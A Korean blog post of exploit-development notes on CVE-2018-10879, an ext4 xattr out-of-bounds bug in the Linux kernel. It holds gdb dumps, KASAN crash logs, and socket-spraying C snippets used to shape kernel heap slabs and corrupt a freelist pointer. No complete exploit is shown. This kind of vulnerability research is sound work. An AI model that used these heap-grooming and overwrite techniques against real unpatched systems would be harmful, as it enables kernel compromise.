---
layout: post
title: "Exploit note(CVE-2018-10879)"
author: "nonetype"
---

# 목차

1. TOC
{:toc}

---

# Vulnerability Analysis
해당 취약점은 `lost+found entry`가 `allocation bitmap`으로 확인되어 `buffer_verified` 플래그가 설정되고, `ext4_rename` 함수 내에서 `old_dentry`를 삭제하는 과정 중, 적합한 사이즈의 `xattr entry`를 찾으려 파일 시스템 내의 엔트리를 순회하는 중 `lost+found entry`가 `xattr entry`가 아님에도 불구하고 `buffer_verified` 플래그 체크가 되어있으므로 `xattr entry`로 오인되어 해당 엔트리 영역을 search하고, 해당 영역에 존재하는 스프레잉 된 값 `offset`으로 참조하여 다음 `Entry`를 찾으므로 연결 리스트의 offset이 heap 메모리에 할당된 `[s->base] ~ [s->end]` 영역을 벗어나 다른 커널 오브젝트를 참조함으로써 발생하는 `Slab-OOB` 취약점이다.

## ext4_xattr_block_find()
순회 중 참조하는 `ext4_xattr_block_find->ext4_xattr_search` 구조체는 `ext4_xattr_block_find()` 함수에서 필드 값을 채워준다.


```c
static int
ext4_xattr_block_find(struct inode *inode, struct ext4_xattr_info *i,
		      struct ext4_xattr_block_find *bs)
{
		bs->bh = sb_bread(sb, EXT4_I(inode)->i_file_acl);
                ...
                ...
		/* Find the named attribute. */
		/*
		#define BHDR(bh) ((struct ext4_xattr_header *)((bh)->b_data))
		*/
		bs->s.base = BHDR(bs->bh);
		/*
		#define BFIRST(bh) ENTRY(BHDR(bh)+1)
		*/
		bs->s.first = BFIRST(bs->bh);
		bs->s.end = bs->bh->b_data + bs->bh->b_size;
		bs->s.here = bs->s.first;
		error = xattr_find_entry(inode, &bs->s.here, bs->s.end,
					 i->name_index, i->name, 1);
		if (error && error != -ENODATA)
			goto cleanup;
		bs->s.not_found = error;
                ...
```

아래는 `bs->s.base = BHDR(bs->bh);` 코드가 실행되기 전 확인한 `bs`와 `bs->bh` 구조체 필드이다.
유의깊게 봐야 하는 점은, `bs->bh->b_state` 값이 `0x4000021`으로, `buffer_verified` 플래그(`0x4000000`)가 설정되었다는 것과 Heap 영역에 할당되는 구조체의 크기 `bs->bh->b_size`가 `0x400`이라는 점이다.

```sh
gef➤  p *$2
$3 = {
  s = {
    first = 0x0 <irq_stack_union>,
    base = 0x0 <irq_stack_union>,
    end = 0x0 <irq_stack_union>,
    here = 0x0 <irq_stack_union>,
    not_found = 0xffffffc3
  },
  bh = 0xffff88007bf714e0
}
gef➤  p *$2->bh
$4 = {
  b_state = 0x4000021,
  b_this_page = 0xffff88007bf71680,
  b_page = 0xffffea0001eaac80,
  b_blocknr = 0x23,
  b_size = 0x400,
  b_data = 0xffff88007aab2c00 "\002",
  b_bdev = 0xffff88007cc28340,
  b_end_io = 0x0 <irq_stack_union>,
  b_private = 0x0 <irq_stack_union>,
  b_assoc_buffers = {
    next = 0xffff88007bf71528,
    prev = 0xffff88007bf71528
  },
  b_assoc_map = 0x0 <irq_stack_union>,
  b_count = {
    counter = 0x2
  }
}
```

아래는 필드 할당 후의 구조체의 모습이다.
`bs->s->base`와 `bs->s->end`가 설정되어 Heap 영역에 할당된 구조체의 범위를 알 수 있었고, `first`와 `here` 필드가 `lost+found entry`를 가르키며, `NEXT(first)` 연산이 몇 차례 이루어지면 `0x9b9b9b9b` 영역을 참조할 수 있음을 알 수 있다.

```sh
gef➤  p *$2
$6 = {
  s = {
    first = 0xffff88007aab2c20,
    base = 0xffff88007aab2c00,
    end = 0xffff88007aab3000,
    here = 0xffff88007aab2c20,
    not_found = 0xffffffc3
  },
  bh = 0xffff88007bf714e0
}
gef➤  p *$2->bh
$5 = {
  b_state = 0x4000021,
  b_this_page = 0xffff88007bf71680,
  b_page = 0xffffea0001eaac80,
  b_blocknr = 0x23,
  b_size = 0x400,
  b_data = 0xffff88007aab2c00 "\002",
  b_bdev = 0xffff88007cc28340,
  b_end_io = 0x0 <irq_stack_union>,
  b_private = 0x0 <irq_stack_union>,
  b_assoc_buffers = {
    next = 0xffff88007bf71528,
    prev = 0xffff88007bf71528
  },
  b_assoc_map = 0x0 <irq_stack_union>,
  b_count = {
    counter = 0x2
  }
}

gef➤  x/128gx 0xffff88007aab2c00
0xffff88007aab2c00:	0x0201000c00000002	0x000000020000002e
0xffff88007aab2c10:	0x00002e2e0202000c	0x020a00140000000b
0xffff88007aab2c20:	0x756f662b74736f6c	0x0000000c0000646e
0xffff88007aab2c30:	0x006f6f660203000c	0x0201000c00000013
0xffff88007aab2c40:	0x0000005200000061	0x000000300101000c
0xffff88007aab2c50:	0x0101000c00000053	0x0000005400000031
0xffff88007aab2c60:	0x000000320101000c	0x0101000c00000055
0xffff88007aab2c70:	0x0000005600000033	0x000000340101000c
0xffff88007aab2c80:	0x0101000c00000057	0x0000005800000035
0xffff88007aab2c90:	0x000000360101000c	0xbabeccccbbaa0059
0xffff88007aab2ca0:	0xffffdeadbeefcafe	0x9b9b9b9b9b9bffff
0xffff88007aab2cb0:	0x9b9b9b9b9b9b9b9b	0x9b9b9b9b9b9b9b9b
0xffff88007aab2cc0:	0x9b9b9b9b9b9b9b9b	0x9b9b9b9b9b9b9b9b
0xffff88007aab2cd0:	0x9b9b9b9b9b9b9b9b	0x9b9b9b9b9b9b9b9b
...
0xffff88007aab2ff0:	0x9b9b9b9b9b9b9b9b	0x9b9b9b9b9b9b9b9b
0xffff88007aab3000:	0x0000000000000000	0x0000000000000000
```

## ext4_xattr_set_entry()

```
                                                       +--------------------+
                                                       |                    |
                                                       |                    |
                                                       |                    |
            ENTRY 01           ENTRY 02                |                    |
      +------------+-----+------------+-----+          |                    |
      |            |     |            |     |          |    OTHER OBJECT    |
      | e_name_len | ... | e_name_len | ... |          |                    |
      |            |     |            |     |          |                    |
      +------------+------------------+-----+          |                    |
      |                  ^                             |                    |
      |                  |                             |                    |
      |                  |                       +---->---------------------+
      +------------------+                       |     |                    |
                                                 |     |      ENTRY  N      |
    EXT4_XATTR_NEXT(ENTRY_01)                    |     |                    |
                                                 |     +--------------------+  <+ EXT4_XATTR_NEXT(ENTRY N-1)
((&ENTRY_01) + e_name_len + 0x0f)                |     |                    |
                                                 |     |      ENTRY N-1     |
                                                 |     |                    |
                                                 |     +--------------------+
                                                 |     *                    *
                                                 |     *                    *
                                                 |     *                    *
     struct ext4_xattr_search                    |     +--------------------+
                                                 |     |                    |
 +------------------------------+                |     |      ENTRY 03      |
 |            first             +-----+          |     |                    |
 +------------------------------+     |          |     +--------------------+ <+ EXT4_XATTR_NEXT(ENTRY 02)
 |            base              |     |          |     |                    |
 +------------------------------+     |          |     |      ENTRY 02      |
 |             end              +----------------+     |                    |
 +------------------------------+     |                +--------------------+ <+ EXT4_XATTR_NEXT(ENTRY 01)
 |            here              |     |                |                    |
 +------------------------------+     +--------------->+      ENTRY 01      |
 |          not_found           |                      |                    |
 +------------------------------+                      +--------------------+
31                            0
```



<!--
테스트 이미지 0xD0a0 위치에 data entry 존재. (0x44 )


gef➤  p *(struct ext4_xattr_entry *)0xffff8800799d04a4
$16 = {
  e_name_len = 0x4,
  e_name_index = 0x7,
  e_value_offs = 0x18,
  e_value_inum = 0x0,
  e_value_size = 0x44,
  e_hash = 0x0,
  e_name = 0xffff8800799d04b4 "data"
}


00 00 02 EA 04 07 18 00 00 00 00 00 44 00 00 00 00 00 00 00 64 61 74 61 00 00 00 00 0E 00 00 00 0C 00 03 01 68 6C 6E 00 12 00 00 00 38 00 03 07
��ê�����D�������data��������hln����8�


해당 값이 controlable? 조절 가능하면 대박쓰 안될가능성 높음
e_value_size는 체크 존재하는듯
-->

OOB Write되는 주소에 할당되있던 값은 다음과 같다.
syslog 관련 object로 추정되며, 각 오브젝트 크기는 `block`크기와 동일한 `0x400`이다.

```
gef➤  x/32gx 0xffff88007b773400
0xffff88007b773400:	0xffff88007b770c00	0x4f4c5359530a373d
0xffff88007b773410:	0x494c494341465f47	0x444f430a333d5954
0xffff88007b773420:	0x2e3d454c49465f45	0x64752f6372732f2e
0xffff88007b773430:	0x2d766564752f7665	0x0a632e73656c7572
0xffff88007b773440:	0x4e494c5f45444f43	0x430a363032323d45
0xffff88007b773450:	0x434e55465f45444f	0x6564753d4e4f4954
0xffff88007b773460:	0x5f73656c75725f76	0x6f745f796c707061
0xffff88007b773470:	0x530a746e6576655f	0x44495f474f4c5359
0xffff88007b773480:	0x5245494649544e45	0x646d65747379733d
0xffff88007b773490:	0x4d0a64766564752d	0x473d454741535345
0xffff88007b7734a0:	0x2f20352050554f52	0x766564752f62696c
0xffff88007b7734b0:	0x642e73656c75722f	0x766564752d30352f
0xffff88007b7734c0:	0x746c75616665642d	0x323a73656c75722e
0xffff88007b7734d0:	0x647562696c2f0a35	0x63697665642d7665
0xffff88007b7734e0:	0x2c3832313a632e65	0x6f6974636e756620
0xffff88007b7734f0:	0x645f76656475206e	0x65675f6563697665
```

이 값을 확인해보면, `400`위치에는 어떤 포인터가, `408` 위치부터는 문자열이 존재한다.

```
gef➤  x/s 0xffff88007b773408
0xffff88007b773408:	"=7\nSYSLOG_FACILITY=3\nCODE_FILE=../src/udev/udev-rules.c\nCODE_LINE=2206\nCODE_FUNCTION=udev_rules_apply_to_event\nSYSLOG_IDENTIFIER=systemd-udevd\nMESSAGE=GROUP 5 /lib/udev/rules.d/50-udev-default.rules:25\n/libudev-device.c:128, function udev_device_get_driver(). Ignoring.\n"
```

`400`위치의 포인터를 따라가 보면, 연결 리스트 형태로 각각의 로그 문자열을 참조하고 있음을 알 수 있다.
```
gef➤  x/gx 0xffff88007b770c00
0xffff88007b770c00:	0xffff88007b772000
gef➤  x/a 0xffff88007b770c00
0xffff88007b770c00:	0xffff88007b772000
gef➤  x/a 0xffff88007b772000
0xffff88007b772000:	0xffff88007b773800
gef➤  x/a 0xffff88007b773800
0xffff88007b773800:	0xffff88007b772c00
gef➤  x/a 0xffff88007b772c00
0xffff88007b772c00:	0xffff88007b770800
gef➤  x/a 0xffff88007b770800
0xffff88007b770800:	0xffff88007b770000
gef➤  x/a 0xffff88007b770000
0xffff88007b770000:	0xffff88007b771800
gef➤
0xffff88007b770008:	0x4f4c5359530a373d
gef➤
0xffff88007b770010:	0x494c494341465f47
gef➤
0xffff88007b770018:	0x444f430a333d5954
gef➤  x/s 0xffff88007b770008
0xffff88007b770008:	"=7\nSYSLOG_FACILITY=3\nCODE_FILE=../src/udev/udev-node.c\nCODE_LINE=344\nCODE_FUNCTION=udev_node_add\nSYSLOG_IDENTIFIER=systemd-udevd\nMESSAGE=handling device node '/dev/tty4', devnum=c4:4, mode=0620, uid=0, gid=5\n79290\nSystem Message Bus Socket.\nRESULT=done\n"
gef➤
```

이후 흐름을 쭉 따라갈 경우 `OOB Write`가 발생하여 아래와 같은 메모리 변경을 일으킨다.

```
gef➤  x/32gx 0xffff88007b773400
0xffff88007b773400:	0xcafebabedeadbeef	0xcafebabedeadbeef
0xffff88007b773410:	0x7b770c00deadbeef	0x530a373dffff8800
0xffff88007b773420:	0x41465f474f4c5359	0x333d5954494c4943
0xffff88007b773430:	0x49465f45444f430a	0x72732f2e2e3d454c
0xffff88007b773440:	0x752f766564752f63	0x656c75722d766564
0xffff88007b773450:	0x45444f430a632e73	0x32323d454e494c5f
0xffff88007b773460:	0x5f45444f430a3630	0x4e4f4954434e5546
0xffff88007b773470:	0x75725f766564753d	0x6c7070615f73656c
0xffff88007b773480:	0x6576655f6f745f79	0x4f4c5359530a746e
0xffff88007b773490:	0x49544e4544495f47	0x7379733d52454946
0xffff88007b7734a0:	0x6564752d646d6574	0x415353454d0a6476
0xffff88007b7734b0:	0x50554f52473d4547	0x2f62696c2f203520
0xffff88007b7734c0:	0x6c75722f76656475	0x2d30352f642e7365
0xffff88007b7734d0:	0x6665642d76656475	0x6c75722e746c7561
0xffff88007b7734e0:	0x6c2f0a35323a7365	0x642d766564756269
0xffff88007b7734f0:	0x3a632e6563697665	0x6e7566202c383231
gef➤
```

## 10/08 16:42
해당 구조체들은 모두 연결 리스트로 이루어져 있음.
각 구조체마다 위에 명시했듯 로그 문자열을 가지고 있으며, 가장 최근에 할당된 메모리에는 포인터가 NULL임.
따라서 새로운 로그 문자열이 할당될 때 우리가 적어준 주소의 포인터에 새로 할당한 로그 문자열 청크의 주소를 적어주는듯?

테스트 삼아 0x1234123412341234 위치에 할당 후 해당 주소 확인해보는걸로

```
[  185.454859] EXT4-fs (loop0): mounted filesystem with ordered data mode. Opts: (null)
[  185.899817] ==================================================================
[  185.900525] BUG: KASAN: slab-out-of-bounds in ext4_xattr_free_space+0x200/0x300
[  185.900525] Read of size 4 at addr ffff88006bf110dc by task poc/1814
[  185.900525]
[  185.900525] CPU: 0 PID: 1814 Comm: poc Not tainted 4.17.0 #8
[  185.900525] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[  185.900525] Call Trace:
[  185.900525]  dump_stack+0xc2/0x16b
[  185.900525]  ? show_regs_print_info+0x5/0x5
[  185.900525]  ? kmsg_dump_rewind_nolock+0xd4/0xd4
[  185.900525]  ? finish_task_switch+0x2c8/0x930
[  185.900525]  print_address_description+0x6e/0x280
[  185.900525]  kasan_report+0x253/0x380
[  185.900525]  ? ext4_xattr_free_space+0x200/0x300
[  185.900525]  ext4_xattr_free_space+0x200/0x300
[  185.900525]  ext4_expand_extra_isize_ea+0x1140/0x17f0
[  185.900525]  ? __schedule+0x712/0x17b0
[  185.900525]  ? pci_mmcfg_check_reserved+0x100/0x100
[  185.900525]  ? ext4_xattr_set+0x330/0x330
[  185.900525]  ? __ext4_get_inode_loc+0x3d0/0xeb0
[  185.900525]  ? jbd2_journal_free_transaction+0x20/0x20
[  185.900525]  ? __jbd2_journal_temp_unlink_buffer+0x4f0/0x530
[  185.900525]  ? other_inode_match+0x9c0/0x9c0
[  185.900525]  __ext4_expand_extra_isize+0x152/0x280
[  185.900525]  ext4_mark_inode_dirty+0x5ff/0x870
[  185.900525]  ? ext4_expand_extra_isize+0x4c0/0x4c0
[  185.900525]  ? ext4_generic_delete_entry+0x1ad/0x470
[  185.900525]  ? up_read+0x20/0x20
[  185.900525]  ext4_delete_inline_entry+0x33c/0x590
[  185.900525]  ? ext4_find_inline_entry+0x400/0x400
[  185.900525]  ? ext4_expand_extra_isize+0x4c0/0x4c0
[  185.900525]  ext4_delete_entry+0x2e0/0x460
[  185.900525]  ? ext4_generic_delete_entry+0x470/0x470
[  185.900525]  ext4_rename+0x1fca/0x2f60
[  185.900525]  ? ext4_tmpfile+0x400/0x400
[  185.900525]  ? ext4_find_entry+0x80a/0xef0
[  185.900525]  ? __d_alloc+0x63d/0xc60
[  185.900525]  ? lockref_get+0x1b2/0x310
[  185.900525]  ? blk_mq_debugfs_unregister_sched_hctx+0x70/0x70
[  185.900525]  ? take_dentry_name_snapshot+0xbb/0x270
[  185.900525]  vfs_rename+0x9d0/0x1810
[  185.900525]  ? vfs_link+0xaa0/0xaa0
[  185.900525]  ? __d_lookup+0x700/0x700
[  185.900525]  ? ext4_cross_rename+0x2040/0x2040
[  185.900525]  do_renameat2+0x9a6/0xec0
[  185.900525]  ? user_path_create+0x30/0x30
[  185.900525]  ? cpumask_weight.constprop.2+0x35/0x35
[  185.900525]  ? _cond_resched+0x12/0x60
[  185.900525]  ? downgrade_write+0x1a0/0x1a0
[  185.900525]  ? rcu_note_context_switch+0x440/0x440
[  185.900525]  ? __do_page_fault+0x47a/0xa60
[  185.900525]  __x64_sys_rename+0x55/0x80
[  185.900525]  ? exit_to_usermode_loop+0x117/0x1a0
[  185.900525]  do_syscall_64+0x137/0x430
[  185.900525]  ? syscall_return_slowpath+0x2e0/0x2e0
[  185.900525]  ? do_page_fault+0x90/0x360
[  185.900525]  ? __do_page_fault+0xa60/0xa60
[  185.900525]  ? prepare_exit_to_usermode+0x1ae/0x200
[  185.900525]  ? perf_trace_sys_enter+0x1050/0x1050
[  185.900525]  ? __put_user_4+0x1c/0x30
[  185.900525]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[  185.900525] RIP: 0033:0x7fd421b75d47
[  185.900525] RSP: 002b:00007ffe1a6ea488 EFLAGS: 00000206 ORIG_RAX: 0000000000000052
[  185.900525] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007fd421b75d47
[  185.900525] RDX: 000055c7cab670a0 RSI: 000055c7cab670a0 RDI: 000055c7cab67080
[  185.900525] RBP: 00007ffe1a6ea4c0 R08: 000055c7cab67010 R09: 0000000000000000
[  185.900525] R10: 0000000000000642 R11: 0000000000000206 R12: 000055c7ca8555d0
[  185.900525] R13: 00007ffe1a6ea5c0 R14: 0000000000000000 R15: 0000000000000000
[  185.900525]
[  185.900525] Allocated by task 1354:
[  185.900525]  kasan_kmalloc+0xa0/0xd0
[  185.900525]  kmem_cache_alloc+0xbf/0x190
[  185.900525]  mempool_alloc+0x119/0x380
[  185.900525]  bio_alloc_bioset+0x347/0x650
[  185.900525]  mpage_alloc.isra.10+0x58/0x270
[  185.900525]  do_mpage_readpage+0xeef/0x16e0
[  185.900525]  mpage_readpages+0x3a1/0x6e0
[  185.900525]  __do_page_cache_readahead+0x51b/0x9f0
[  185.925035]  force_page_cache_readahead+0x1b7/0x310
[  185.925035]  generic_file_read_iter+0x11ca/0x1f70
[  185.925035]  __vfs_read+0x548/0x810
[  185.925035]  vfs_read+0xdc/0x2d0
[  185.925035]  ksys_read+0xcb/0x1e0
[  185.925035]  do_syscall_64+0x137/0x430
[  185.925035]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[  185.925035]
[  185.925035] Freed by task 1808:
[  185.925035]  __kasan_slab_free+0x12e/0x180
[  185.925035]  kmem_cache_free+0x70/0x1a0
[  185.925035]  bio_put+0x123/0x180
[  185.925035]  bio_endio+0x2c9/0x5c0
[  185.925035]  blk_update_request+0x1e2/0xb10
[  185.925035]  blk_mq_end_request+0x48/0x100
[  185.925035]  __blk_mq_complete_request+0x501/0x800
[  185.925035]  blk_mq_complete_request+0x1b5/0x2e0
[  185.925035]  loop_queue_work+0x218/0x38a0
[  185.925035]  kthread_worker_fn+0x370/0x7c0
[  185.925035]  kthread+0x2d6/0x390
[  185.925035]  ret_from_fork+0x35/0x40
[  185.925035]
[  185.925035] The buggy address belongs to the object at ffff88006bf11000
[  185.925035]  which belongs to the cache bio-0 of size 176
[  185.925035] The buggy address is located 44 bytes to the right of
[  185.925035]  176-byte region [ffff88006bf11000, ffff88006bf110b0)
[  185.925035] The buggy address belongs to the page:
[  185.925035] page:ffffea0001afc440 count:1 mapcount:0 mapping:0000000000000000 index:0x0
[  185.925035] flags: 0x100000000000100(slab)
[  185.925035] raw: 0100000000000100 0000000000000000 0000000000000000 0000000180100010
[  185.925035] raw: dead000000000100 dead000000000200 ffff88006c353140 0000000000000000
[  185.925035] page dumped because: kasan: bad access detected
[  185.925035]
[  185.925035] Memory state around the buggy address:
[  185.925035]  ffff88006bf10f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  185.925035]  ffff88006bf11000: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  185.925035] >ffff88006bf11080: fb fb fb fb fb fb fc fc fc fc fc fc fc fc fc fc
[  185.925035]                                                     ^
[  185.925035]  ffff88006bf11100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  185.925035]  ffff88006bf11180: fb fb fb fb fb fb fc fc fc fc fc fc fc fc fc fc
[  185.925035] ==================================================================
[  185.925035] Disabling lock debugging due to kernel taint
[  185.993116] EXT4-fs error (device loop0): ext4_xattr_inode_iget:390: comm poc: error while reading EA inode 1970234923 err=-117
```


## 10/09

지금까지 정리된 내용은 아래와 같다.

(1) set_entry에서 사용하는 heap object size: 1K
(2) (1)의 메모리 뒤에 존재하는 heap object size도 1K
(3) 취약점 트리거링 이후 (2) 오브젝트의 앞 0x10Byte를 Overwrite 가능
(4) 분석 결과 (2) 오브젝트는 syslog object일 확률이 높으며, free되었을 경우 freelist(연결리스트) 관리를 위해 앞 8바이트에 다음 free'd chunk 주소를 가지고 있음.
	-> 크래시가 터지는걸 보면 slab_alloc하는 중, freelist를 쭉 순회하다가 corrupted된 freelist ptr를 참조하여 page fault


gdb로 확인해보면,


* set_entry에서 bp걸렸을 때 search 구조체
```
$19 = {
  first = 0xffff88007bbe7420,
  base = 0xffff88007bbe7400,
  end = 0xffff88007bbe7800,
  here = 0xffff88007bbe7420,
  not_found = 0xffffffc3
}
```

* 해당 구조체 영역 다음의 내용(`s->end`부터의 내용)
```
gef➤  x/s 0xffff88007bbe7800
0xffff88007bbe7800:	"PRIORITY=7\nSYSLOG_FACILITY=4\nCODE_FILE=../src/libsystemd/sd-bus/sd-bus.c\nCODE_LINE=2537\nCODE_FUNCTION=process_message\nSYSLOG_IDENTIFIER=systemd-logind\nMESSAGE=Got message type=signal sender=:1.0 destination=n/a object=/org/freedesktop/systemd1 interface=org.freedesktop.systemd1.Manager member=UnitRemoved cookie=173 reply_cookie=0 error=n/a\ne=170 reply_cookie=0 error=n/a\n.Properties member=PropertiesChanged cookie=130 reply_cookie=0 error=n/a\n"
```

* 시간이 잠시 지난 후 같은 메모리의 내용
```
gef➤  x/32gx 0xffff88007bbe7800
0xffff88007bbe7800:	0xffff88007bbe7400	0x1234123412343400
0xffff88007bbe7810:	0x4f495250deadbeef	0x530a373d59544952
0xffff88007bbe7820:	0x41465f474f4c5359	0x343d5954494c4943
...
```


* `0xffff88007bbe7800`에 위치하는 포인터가 가르키는 주소의 값
```
gef➤  x/32gx 0xffff88007bbe7400
0xffff88007bbe7400:	0xffff88007bbe5000	0x1e1292ff0000002e
0xffff88007bbe7410:	0x00002e2e0202000c	0x020a00140000000b
0xffff88007bbe7420:	0x0000000003bc0704	0xe1e16d0000000044
```

* overwrite한 주소를 access한 후 크래시가 터지는 상황에서의 Call Trace
```
#0  slab_alloc_node (addr=<optimized out>, node=<optimized out>, gfpflags=<optimized out>, s=<optimized out>) at mm/slub.c:2726
#1  __kmalloc_node_track_caller (size=0x23ac0, gfpflags=0x15106c0, node=0xd89, caller=<optimized out>) at mm/slub.c:4364
#2  0xffffffff81992619 in __kmalloc_reserve (size=0x2c0, flags=0x15004c0, node=0xffffffff, pfmemalloc=0xffffc9000031fb67, ip=<optimized out>) at net/core/skbuff.c:137
#3  0xffffffff819936ad in __alloc_skb (size=<optimized out>, gfp_mask=0x15106c0, flags=<optimized out>, node=0xd8a) at net/core/skbuff.c:205
#4  0xffffffff8199470f in alloc_skb (priority=<optimized out>, size=<optimized out>) at ./include/linux/skbuff.h:987
#5  alloc_skb_with_frags (header_len=<optimized out>, data_len=0x0, max_page_order=0x3, errcode=<optimized out>, gfp_mask=0x15000c0) at net/core/skbuff.c:5249
#6  0xffffffff8198e568 in sock_alloc_send_pskb (sk=0xffff88007b5a6400, header_len=<optimized out>, data_len=<optimized out>, noblock=<optimized out>, errcode=0xffffc9000031fca0, max_page_order=<optimized out>) at net/core/sock.c:2088
#7  0xffffffff81a7a2e2 in unix_dgram_sendmsg (sock=0xffff88007bd26500, msg=0xffffc9000031fec0, len=0x151) at net/unix/af_unix.c:1672
#8  0xffffffff81989881 in sock_sendmsg_nosec (msg=<optimized out>, sock=<optimized out>) at net/socket.c:629
#9  sock_sendmsg (sock=0xffff88007bd26500, msg=0xffffc9000031fec0) at net/socket.c:639
#10 0xffffffff81989e2a in ___sys_sendmsg (sock=0xffff88007bd26500, msg=<optimized out>, msg_sys=0xffffc9000031fec0, flags=0x4000, used_address=<optimized out>, allowed_msghdr_flags=<optimized out>) at net/socket.c:2117
#11 0xffffffff8198b079 in __sys_sendmsg (fd=<optimized out>, msg=0x15106c0, flags=0xd89, forbid_cmsg_compat=<optimized out>) at net/socket.c:2155
#12 0xffffffff810023c9 in do_syscall_64 (nr=<optimized out>, regs=0x15106c0) at arch/x86/entry/common.c:287
#13 0xffffffff81c00088 in entry_SYSCALL_64 () at arch/x86/entry/entry_64.S:238
#14 0x0000000000000000 in ?? ()
```

이로써 위와 같은 결과가 도출되었다.

Lexfo 문서에서 kmalloc-1024를 사용한다고 봤던게 기억나서 따라해봤지만 현재 환경에서는 kmalloc-2048을 사용하여 구조체를 할당한다..

### 20:55
kmalloc free'd pointer를 userspace로 수정하면 아래와 같은 corrupted check에서 걸리는 듯 하다.
```c
/* Verify that a pointer has an address that is valid within a slab page */
static inline int check_valid_pointer(struct kmem_cache *s,
				struct page *page, void *object)
{
	void *base;

	if (!object)
		return 1;

	base = page_address(page);
	object = restore_red_left(s, object);
	if (object < base || object >= base + page->objects * s->size ||
		(object - base) % s->size) {
		return 0;
	}

	return 1;
}
```

vitaly, wen xu의 발표 슬라이드들의 spraying 기법들을 살펴보고 있는데, 주로 socket open을 통해 spraying을 하는 듯.

아래는 `ETH_P_ARP` 인자로 스프레잉 테스트
```c
#define _GNU_SOURCE
#include <asm/types.h>
#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <stdbool.h>
#include <sched.h>
#include <stddef.h>
#include <sys/mman.h>
#include <stdint.h>
#include <linux/in.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <netinet/if_ether.h>
#include <net/if.h>

#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)

int main(){
	while(1) {
		for(int i = 0; i < 200; ++i)
			_socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
		getchar();
	}
	return 0;
}
```

```sh
watch -n 0.1 'sudo cat /proc/slabinfo | egrep "kmalloc-|size-" | grep -vi dma'
```

`kmalloc-2048`가 증가한다.


## 10/10

SYSLOG도 소켓을 통해 메모리를 할당하므로 해당 소켓이 어떤 타입인지 확인하고 유저가 직접 해당 타입의 소켓을 생성해주면 될듯..?
소켓 타입을 찾아보자.

call trace로 보면 `AF_UNIX + SOCK_DGRAM` 인 것 같은데, 아래와 같이 할당하면 `kmalloc-64`가 할당된다.

```c
int main(){
	while(1) {
		for(int i = 0; i < 200; ++i)
			_socket(AF_UNIX, SOCK_DGRAM, 0);
		getchar();
	}
	return 0;
}
```

SYSLOG socket -> kmalloc-1024
unix_dgram_alloc AF_Unix, SOCK_DGRAM -> kmalloc-64

<https://yeonnic.tistory.com/68>에 연호가 이미 정리해놨었다..

위 소스 코드를 조금 수정해서 테스트해보려고 했는데 `userfaultfd: Function not implemented` 에러가 뜬다.
해당 오류 수정중


<details markdown="1">
<summary>Full crash for check</summary>

 ```
[   37.409792] EXT4-fs (loop0): mounted filesystem with ordered data mode. Opts: (null)
[   37.545715] EXT4-fs error (device loop0): ext4_xattr_inode_iget:390: comm poc: error while reading EA inode 1970234923 err=-117
[   37.575410] EXT4-fs warning (device loop0): ext4_expand_extra_isize_ea:2791: Unable to expand inode 13. Delete some EAs or run e2fsck.
[   37.581976] poc (1705) used greatest stack depth: 13480 bytes left
root@syzkaller:~/79# ./go.sh
mkdir: cannot create directory 'mnt': File exists
[   46.435960] general protection fault: 0000 [#1] SMP NOPTI
[   46.436041] Modules linked in:
[   46.436041] CPU: 0 PID: 1673 Comm: systemd-udevd Not tainted 4.17.0 #7
[   46.436041] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[   46.438150] RIP: 0010:__kmalloc_node_track_caller+0xfe/0x230
[   46.438150] RSP: 0018:ffffc900004bfae0 EFLAGS: 00000282
[   46.438150] RAX: 0000000000000000 RBX: cafebabedeadbeef RCX: 0000000000000ce6
[   46.438150] RDX: 0000000000000ce5 RSI: 00000000015106c0 RDI: 0000000000023ac0
[   46.438150] RBP: ffff88007cb76c00 R08: ffff88007fc23ac0 R09: 0000000000000000
[   46.438150] R10: ffff88007c92f000 R11: 0000000000004000 R12: 00000000015106c0
[   46.438150] R13: 0000000000000240 R14: 00000000ffffffff R15: ffff88007d001500
[   46.438150] FS:  00007f9078f3b8c0(0000) GS:ffff88007fc00000(0000) knlGS:0000000000000000
[   46.438150] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   46.438150] CR2: 0000555d1d3cbd60 CR3: 000000007b78a000 CR4: 00000000000006f0
[   46.438150] Call Trace:
[   46.438150]  ? __alloc_skb+0x7d/0x1d0
[   46.438150]  __kmalloc_reserve.isra.43+0x29/0x80
[   46.438150]  __alloc_skb+0x7d/0x1d0
[   46.438150]  ? __activate_page+0x220/0x220
[   46.438150]  alloc_skb_with_frags+0x5f/0x1b0
[   46.438150]  ? wait_woken+0x80/0x80
[   46.438150]  sock_alloc_send_pskb+0x1f8/0x230
[   46.438150]  ? _cond_resched+0x10/0x40
[   46.438150]  ? wait_for_unix_gc+0x2f/0xa0
[   46.438150]  unix_dgram_sendmsg+0x132/0x6e0
[   46.438150]  sock_sendmsg+0x31/0x40
[   46.438150]  ___sys_sendmsg+0x26a/0x2c0
[   46.438150]  ? seccomp_run_filters+0x54/0xb0
[   46.438150]  ? shmem_truncate_range+0x19/0x40
[   46.438150]  ? fsnotify_destroy_marks+0xb/0xd0
[   46.438150]  ? __seccomp_filter+0x3e/0x570
[   46.438150]  ? dentry_kill+0x42/0x160
[   46.438150]  ? __sys_sendmsg+0x59/0xa0
[   46.438150]  __sys_sendmsg+0x59/0xa0
[   46.438150]  do_syscall_64+0x49/0x100
[   46.438150]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
[   46.438150] RIP: 0033:0x7f9078083e67
[   46.438150] RSP: 002b:00007ffc9ba5ad28 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
[   46.438150] RAX: ffffffffffffffda RBX: 00007ffc9ba5ad30 RCX: 00007f9078083e67
